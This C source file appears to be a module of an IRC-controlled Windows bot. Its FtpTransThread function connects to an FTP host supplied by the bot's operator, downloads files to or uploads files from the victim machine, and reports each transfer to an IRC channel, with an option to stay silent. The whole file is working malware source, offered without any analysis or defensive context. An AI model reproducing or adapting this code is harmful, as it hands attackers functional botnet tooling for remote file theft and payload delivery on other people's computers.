#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

#ifndef NO_FTPTRANS
DWORD WINAPI FtpTransThread(LPVOID param)
{  
	char sendbuf[IRCLINE];

 	FTPTRANS ftptrans = *((FTPTRANS *)param);
    FTPTRANS *ftptranss = (FTPTRANS *)param;
	ftptranss->gotinfo = TRUE;
    
	HANDLE IntConn = fInternetConnect(ih, ftptrans.host, INTERNET_DEFAULT_FTP_PORT,
		ftptrans.username, ftptrans.password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
	Sleep(1000);

	if (IntConn) {
		if (ftptrans.get) {
			if (fFtpGetFile(IntConn, ftptrans.remote, ftptrans.local, FALSE, FILE_ATTRIBUTE_NORMAL, 
				FTP_TRANSFER_TYPE_UNKNOWN | INTERNET_FLAG_RELOAD, 0))
				_snprintf(sendbuf,sizeof(sendbuf),"[FTPTRANS]: Successful download of: %s/%s to: %s.",
					ftptrans.host, ftptrans.remote, ftptrans.local);
			else
				_snprintf(sendbuf,sizeof(sendbuf),PrintError("[FTPTRANS]:"));
		} else {
			if (fFtpPutFile(IntConn, ftptrans.local, ftptrans.remote, FTP_TRANSFER_TYPE_UNKNOWN, 0))	
				_snprintf(sendbuf,sizeof(sendbuf),"[FTPTRANS]: Successful upload of: %s to: %s/%s.",
					ftptrans.local, ftptrans.host, ftptrans.remote);
			else 
				_snprintf(sendbuf,sizeof(sendbuf),PrintError("[FTPTRANS]:"));
		}
	} else
		_snprintf(sendbuf,sizeof(sendbuf),"[FTPTRANS]: Error: Failed to connect (invalid hostname or user account).");

	if (!ftptrans.silent) irc_privmsg(ftptrans.sock,ftptrans.chan,sendbuf,ftptrans.notice);
	addlog(sendbuf);
		
    fInternetCloseHandle(IntConn);
	clearthread(ftptrans.threadnum);

	ExitThread(0);
}
#endif